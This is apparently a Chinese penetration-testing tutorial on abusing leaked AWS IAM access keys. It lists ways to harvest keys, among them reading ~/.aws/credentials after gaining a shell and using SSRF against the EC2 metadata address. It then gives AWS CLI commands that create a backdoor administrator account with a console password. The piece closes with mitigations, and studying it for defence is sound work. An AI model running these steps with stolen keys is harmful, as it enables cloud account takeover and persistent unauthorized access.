现在讨论下获得了 aws iam 账号访问密钥时的一些利用方式。


1. 什么是 aws iam 账号访问密钥

访问密钥是 IAM 用户或 AWS 账户根用户的长期凭证。您可以使用访问密钥签署对 AWS CLI 或 AWS API 的编程请求（直接或使用 AWS 开发工具包）。


访问密钥包含两部分：访问密钥 ID（例如 AKIAIOSFODNN7EXAMPLE）和秘密访问密钥（例如 wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY）。与用户名和密码一样，您必须同时使用访问密钥 ID 和秘密访问密钥对请求执行身份验证。你需要像对用户名和密码一样，安全地管理访问密钥。


2. 如何获得访问密钥

1）通过 github 查找泄露的配置文件
2）通过文件读取漏洞读取网站的配置文件
3）拿到shell后，查看用户目录是否存在 ~/.aws/credentials 文件
4)  aws ec2 实例搭建的网站可以尝试通过 SSRF 漏洞等方式读取以下元数据地址
http://169.254.169.254/latest/meta-data/iam/security-credentials/



3. 创建并使用访问密钥
下面先创建一个 iam 管理员的访问密钥来进行实验，也可以直接使用根账号的访问密钥
点击 aws 管理控制台上 个人信息-》我的安全凭证
 


点击用户，创建一个 iam 账号，勾选编程访问和AWS 管理控制台访问



为了让此 iam 账号拥有管理员权限，我们需要创建一个管理员组并附加到该账号。



注意勾选 AdministratorAccess 这个策略



勾选刚才创建的管理员组，点下一步



这里直接下一步审核




点创建用户



创建成功，这里要记录的地方有两个：一个是红框中的登录地址，这个地址是你的账号ID加上固定的地址构成的，只有这个地址是你独有的 AWS 管理控制台地址，可以登录你创建的 aws iam 账号。 二是下载存储 iam 账号的 csv （放在安全的地方），或者直接点击显示，需要记录下访问密钥ID，私有访问密钥，密码。


打开你独有的 aws 管理控制台，登录可以查看账号的所有 aws 资源，如 s3 存储桶、ec2 实例。



4. 访问密钥利用 


现在使用刚才创建的 iam 账号访问密钥来模拟演示利用方式。


如果未安装 aws cli , 可以通过以下命令安装


# pippip3 install awscli --upgrade --user# aptapt install awscli# brewbrew install awscli


在 aws cli 配置访问密钥，
aws configure


现在我们拿到并配置好了 aws iam 账号的访问密钥。


先查看该账号的 id



aws sts get-caller-identity
其中的 Account 的值就是账号 id


通过账号 id 我们可以构造其控制台的登录地址：
http://the_id.signin.aws.amazon.com/console


接下来尝试查看该账号的权限


aws iam list-groups-for-user --user-name admin
可以看到该账号属于管理员组，管理员组的权限相当大，可以管理 aws iam 用户、s3 存储桶、ec2 实例等资源。


这里可以直接创建一个管理员，然后给该账号分配一个登录密码，即可控制 aws 上几乎所有的资源。


创建 aws iam 账号


aws iam create-user --user-name Bob





创建登录密码


aws iam create-login-profile --user-name Bob --password yourpassword


添加用户到管理员组
aws iam add-user-to-group --user-name Bob --group-name administrator


接着打开构造的 aws 管理员控制台地址
http://the_id.signin.aws.amazon.com/console



登录后即获取几乎所有 aws 资源的控制权。

6. 缓解措施


对于访问密钥一些最佳实践可以查看
https://docs.aws.amazon.com/zh_cn/general/latest/gr/aws-access-keys-best-practices.html


主要为以下几点
1）删除或不生成根账户访问密钥
2)  使用临时的安全证书(IAM角色)代替长期访问密钥
3)  不要将访问密钥嵌入到代码中
4)  对不同应用程序使用不同的访问密钥
5）定期更改访问密钥。
6)  删除未使用的访问密钥。 
7) 最敏感的操作配置多重验证。
